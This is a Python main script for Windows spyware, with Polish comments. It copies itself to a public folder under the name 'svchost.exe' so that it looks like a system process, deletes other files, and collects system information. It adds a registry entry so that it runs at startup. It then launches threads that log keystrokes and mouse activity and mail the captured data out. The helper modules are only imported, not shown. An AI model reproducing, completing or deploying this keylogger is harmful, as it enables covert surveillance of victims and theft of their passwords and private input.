import threading
import shutil
import os

from Mouse import MouseAndWrite
from Key import LisAndWrite
from Mail import SendToMail
from AutoStart import AutoStartRegEdit
from Comp_info import ComputerInfo
from AutoRem import AutoRemove


if __name__ == '__main__':
    try:
        s_name = "svchost.exe"
        addres = (r"C:\Users\Public\Roaming")
        address = os.path.join (addres, s_name)
        target = r'C:/Users/Public/Roaming/svchost.exe'
        folderPath = os.getcwd () + r'\svchost.exe'
        print("XX")
    except:
        print("1")
    try:
        os.remove ("Planet.exe")
    except:
        print(":(")
    try:
        shutil.move (folderPath, address)
    except:
        os.remove ("wifi.text")
        print("2")
    try:
        Information = ComputerInfo()
        Information.computer_information()
    except:
        print(3)
    keylogger = LisAndWrite ()  # Tworze obiekt odpwoedzialny za zbieranie danych myszki
    MouseLogger = MouseAndWrite () # Tworze obiekt odpwoedzialny za zbieranie danych klawiatury
    mail = SendToMail() # Tworze obiekt odpwoedzialny za przesyłanie zebranych danych
    autoStart = AutoStartRegEdit() # Tworze obiekt odpwoedzialny za dodanie wpisu rejestru odpwiedzialnego za autostart
    AutoRemove = AutoRemove() # tworze obiekt autousuwania pliku
    autoStart.AddToRegistry()
    try:
        th1 = threading.Thread (target=keylogger.runKey)
    except:
        print("4")
    try:
        th2 = threading.Thread (target=MouseLogger.run)
    except:
        print("5")
    try:
        th3 = threading.Thread (target=mail.LoginAndSend)
    except:
        print("6")
    try:
        th4 = threading.Thread(target=AutoRemove.AutoRemove)
    except:
        print("7")

    th1.start ()
    th2.start ()
    th3.start ()
    th1.join()
    th2.join()
    th3.join()

